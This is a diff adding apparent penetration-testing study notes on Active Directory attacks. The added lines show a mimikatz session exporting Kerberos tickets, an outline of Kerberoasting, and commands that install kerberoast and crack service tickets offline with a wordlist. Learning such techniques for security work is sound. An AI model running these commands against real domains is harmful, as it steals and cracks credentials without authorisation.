@@ -2139,7 +2139,34 @@ klist
   ## built-in command, display all cached Kerberos tickets for the current user.
   ## TODO: find SPNs using LDAP filtering
     #+end_src
-       
+    #+begin_src
+       C:\Tools\active_directory> mimikatz.exe
+
+       mimikatz # privilege::debug
+       Privilege '20' OK
+
+       mimikatz # kerberos::list /export 
+    #+end_src
+    
+**** Kerberoasting?
+     + docs:
+       - [[https://github.com/nidem/kerberoast]]
+
+     + info: 
+       - kerberoast package.
+       - Enumerate SPNs(LDAP) -> request TGSs -> crack weak passwords(espically rc4-hmac) offline -> ?
+       //TODO
+    
+     + src:
+     #+begin_src sh
+sudo apt update && sudo apt install kerberoast
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile> 
+     #+end_src 
+
+**** ? Low and Slow Password Guessing
+
+** Active Directory Lateral Movement
+*** Pass the Hash
 
 * Book4_Chapter 01 An Introduction to TCP/IP
 ** a brief history
